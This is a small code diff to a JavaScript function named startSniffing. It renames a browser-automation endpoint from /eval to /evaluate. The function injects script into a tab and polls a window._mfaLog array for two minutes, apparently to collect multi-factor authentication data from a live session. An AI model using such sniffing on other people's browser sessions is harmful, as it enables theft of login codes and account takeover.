@@ -35,7 +35,7 @@ async function startSniffing() {
 
     await new Promise(r => setTimeout(r, 12000));
 
-    await api(`/tabs/${tabId}/eval`, {
+    await api(`/tabs/${tabId}/evaluate`, {
         userId: USER_ID,
         expression: `
             window._mfaLog = [];
@@ -57,7 +57,7 @@ async function startSniffing() {
     // Chạy trong 2 phút
     for (let i = 0; i < 24; i++) {
         await new Promise(r => setTimeout(r, 5000));
-        const res = await api(`/tabs/${tabId}/eval`, {
+        const res = await api(`/tabs/${tabId}/evaluate`, {
             userId: USER_ID,
             expression: `window._mfaLog`
         });
